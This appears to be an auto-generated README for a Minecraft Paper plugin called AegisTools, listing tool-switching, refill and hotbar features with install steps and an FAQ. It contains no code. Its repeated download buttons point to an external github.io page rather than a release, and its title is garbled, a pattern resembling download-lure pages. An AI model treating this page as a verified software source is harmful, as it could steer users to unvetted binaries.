# AegisTools v - Game Script Utility 2026

> A Paper/Java Minecraft plugin for automatic tool changes, inventory refills, and hotbar management. AegisTools streamlines repetitive mining and block-breaking tasks while keeping its implementation centered on a lightweight Paper API approach.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Paper%2FJava-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/oliverspbennett4758/aegistools-game-script?style=flat-square)](https://github.com/oliverspbennett4758/aegistools-game-script)

---

<p align="center">
  <a href="https://oliverspbennett4758.github.io/aegistools-game-script/">
    <img src="https://img.shields.io/badge/Download-AegisTools%20Script-brightgreen?style=for-the-badge" alt="Download AegisTools Script">
  </a>
</p>

> **[Download AegisTools](https://oliverspbennett4758.github.io/aegistools-game-script/)**

---

[Download Latest Build](https://oliverspbennett4758.github.io/aegistools-game-script/)

---

## What AegisTools Does

AegisTools is made for Minecraft servers running Paper with Java. By examining the block a player is targeting, it can help select a suitable item, keep supplies available, and reduce interruptions during mining and block breaking.

Its utility set covers automatic tool switching, inventory-based refilling, hotbar organization, and an in-game screen for excluding specific blocks. The plugin is intended to provide these conveniences with minimal runtime overhead in a Paper server environment.

## Included Features

- Chooses the suitable tool for the block currently being targeted
- Replenishes items or blocks from the player's inventory when needed
- Offers a hotbar mode that keeps tools accessible through inventory management
- Includes an in-game GUI for adding or removing blacklisted blocks
- Uses the Paper API as its compatibility target
- Keeps its runtime design focused on low overhead
- Assists with mining and other block interactions
- Designed for server-side Paper/Java plugin installations

## Installation

1. Get the newest build from the project page.
2. Copy the plugin file into the server's `plugins` directory.
3. Restart the server, or reload it through your established Paper workflow.
4. Join the game and use the available features in supported situations.

The resulting file path can look like this:

`server/plugins/AegisTools.jar`

After installation, use the in-game GUI or settings provided by the plugin to configure the block blacklist and preferred behavior.

## Available Options

| Setting | Purpose |
| --- | --- |
| Auto-tool | Selects the best tool for the block being targeted |
| Auto-refill | Retrieves replacement items from the player's inventory |
| Hotbar mode | Organizes tools while keeping them available |
| Block blacklist GUI | Excludes chosen blocks through an in-game interface |
| Paper compatibility | Targets servers using the Paper API environment |

## Server Compatibility

AegisTools targets Minecraft servers that run Paper on Java. Because it relies on the Paper API, behavior can differ on other server platforms and on older server configurations.

Actual limitations may be influenced by the Minecraft version, the rest of the installed plugin stack, and other plugins that control inventory, tools, or block interactions. When overlapping functionality is present, test the combination before deploying it widely.

## Common Questions

### What are the installation steps?

Download a build, move it into the server's `plugins` directory, and restart the server.

### How is an existing installation updated?

Substitute the current plugin file with the newer build, then restart or reload the server using your normal procedure.

### Can I exclude particular blocks?

Yes. Open the in-game blacklist GUI and add any blocks that AegisTools should leave unmanaged.

### Is every Minecraft server supported?

The plugin is intended for Paper servers running on Java. Other server platforms may not provide the same behavior or compatibility.

### Where does the plugin save its settings?

Settings are generally kept in the plugin data folder within the server directory, together with the plugin's other files.

### Can tools remain in the hotbar under manual control?

Yes. Hotbar mode is available for players who want tool organization while retaining control over their inventory.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
